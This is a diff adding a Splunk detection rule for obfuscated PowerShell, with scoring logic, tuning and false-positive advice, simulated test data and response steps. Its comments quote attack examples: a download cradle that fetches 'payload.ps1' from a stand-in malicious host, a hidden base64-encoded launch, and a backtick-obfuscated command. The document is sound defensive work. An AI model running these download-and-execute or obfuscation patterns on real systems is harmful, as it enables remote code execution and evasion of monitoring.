@@ -1,0 +1,121 @@
+```
+[PowerShell Obfuscation Detection - T1059.001]
+description = Detects obfuscated PowerShell commands through entropy analysis and suspicious patterns
+search = index=windows (source="*PowerShell*" OR EventCode=4104 OR EventCode=4103) \
+| rex field=ScriptBlockText "(?<ps_command>.+)" \
+| eval command_length = len(ps_command) \
+| eval base64_count = mvcount(split(ps_command, "frombase64")) - 1 \
+| eval backtick_count = mvcount(split(ps_command, "`")) - 1 \
+| eval concat_count = mvcount(split(ps_command, "+")) - 1 \
+| eval dash_count = mvcount(split(ps_command, "-")) - 1 \
+| eval special_char_count = mvcount(split(ps_command, "^")) + mvcount(split(ps_command, "%")) \
+| where command_length > 100 \
+| eval obfuscation_score = (base64_count * 20) + (backtick_count * 5) + (concat_count * 3) + (special_char_count * 10) \
+| where obfuscation_score > 30 OR \
+    (ps_command LIKE "%invoke-expression%" AND ps_command LIKE "%frombase64%") OR \
+    (ps_command LIKE "%iex%" AND (ps_command LIKE "%downloadstring%" OR ps_command LIKE "%webclient%")) OR \
+    (ps_command LIKE "%-e%" AND ps_command LIKE "%-nop%") OR \
+    (ps_command LIKE "%invoke-obfuscation%") \
+| eval severity = case( \
+    obfuscation_score >= 100, "Critical", \
+    obfuscation_score >= 60, "High", \
+    obfuscation_score >= 30, "Medium", \
+    1=1, "Low") \
+| eval mitre_attack = "T1059.001 - PowerShell, T1027 - Obfuscated Files or Information" \
+| eval indicators = "" \
+| eval indicators = if(base64_count > 0, indicators."Base64: ".base64_count.", ", indicators) \
+| eval indicators = if(backtick_count > 5, indicators."Backticks: ".backtick_count.", ", indicators) \
+| eval indicators = if(concat_count > 10, indicators."Concatenation: ".concat_count.", ", indicators) \
+| eval indicators = if(special_char_count > 5, indicators."Special chars: ".special_char_count, indicators) \
+| table _time, ComputerName, UserID, ps_command, command_length, obfuscation_score, severity, indicators, mitre_attack \
+| sort - obfuscation_score
+dispatch.earliest_time = -10m
+dispatch.latest_time = now
+cron_schedule = */10 * * * *
+enableSched = 1
+alert.severity = 4
+
+# OBFUSCATION INDICATORS:
+# 1. Base64 encoding (frombase64, -encodedcommand)
+# 2. Excessive backticks (`) for character splitting
+# 3. String concatenation (+) to break signatures
+# 4. Special characters (^, %) for cmd.exe style obfuscation
+# 5. Download cradles (IEX, DownloadString, WebClient)
+
+# SCORING SYSTEM:
+# - Base64 encoding: +20 points per occurrence
+# - Backtick character: +5 points per occurrence
+# - Concatenation operator: +3 points per occurrence
+# - Special characters: +10 points per occurrence
+#
+# Threshold: 30+ points triggers alert
+
+# SUSPICIOUS PATTERNS:
+# Pattern 1: IEX + Base64
+#   Example: iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("...")))
+#
+# Pattern 2: Download Cradle
+#   Example: IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')
+#
+# Pattern 3: Hidden Execution
+#   Example: powershell.exe -nop -w hidden -e <base64>
+
+# TUNING GUIDANCE:
+# 1. Lower obfuscation_score threshold (30) if you have:
+#    - Strict security posture
+#    - Low PowerShell usage
+#    - Few legitimate automation scripts
+#
+# 2. Raise threshold (50-60) if you have:
+#    - Heavy PowerShell automation
+#    - DevOps/SRE teams using complex scripts
+#    - Many false positives
+#
+# 3. Add whitelisting for known scripts:
+#    | where NOT (ps_command LIKE "%YOUR_KNOWN_SCRIPT%")
+#    | where NOT (ComputerName IN ("automation-server-01", "build-agent-*"))
+
+# FALSE POSITIVES:
+# 1. Legitimate security tools (SCCM, PowerShell DSC)
+#    Whitelist: | where NOT (UserID IN ("svc_sccm", "svc_dsc"))
+#
+# 2. Automation frameworks (Ansible, Puppet)
+#    Whitelist: | where NOT (ComputerName IN ("ansible-*", "puppet-*"))
+#
+# 3. Monitoring agents (Splunk forwarders, SIEM connectors)
+#    Whitelist by known script hash or file path
+
+# BASELINE ANALYSIS:
+# Identify legitimate obfuscated scripts in your environment:
+# index=windows source="*PowerShell*" earliest=-30d
+# | rex field=ScriptBlockText "(?<ps_command>.+)"
+# | eval command_length = len(ps_command)
+# | where command_length > 100
+# | stats count by ps_command, ComputerName, UserID
+# | where count > 10
+# | sort - count
+# Review and whitelist legitimate ones
+
+# TEST DATA:
+# Simulate obfuscated PowerShell:
+# | makeresults
+# | eval _time=now()
+# | eval EventCode=4104
+# | eval ComputerName="TEST-PC"
+# | eval UserID="testuser"
+# | eval ScriptBlockText="po`w`er`sh`el`l -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="
+# | table _time, EventCode, ComputerName, UserID, ScriptBlockText
+
+# RESPONSE ACTIONS:
+# 1. Immediate: Isolate computer from network if critical severity
+# 2. Capture: Full PowerShell script for forensics
+# 3. Investigate: User account for compromise indicators
+# 4. Check: Process tree (parent/child processes)
+# 5. Hunt: Similar patterns across environment
+
+# RELATED DETECTIONS:
+# - Monitor for file downloads after obfuscated PowerShell
+# - Check for credential access attempts (Mimikatz patterns)
+# - Alert on lateral movement from source computer
+# - Track persistence mechanisms (scheduled tasks, registry run keys)
+```
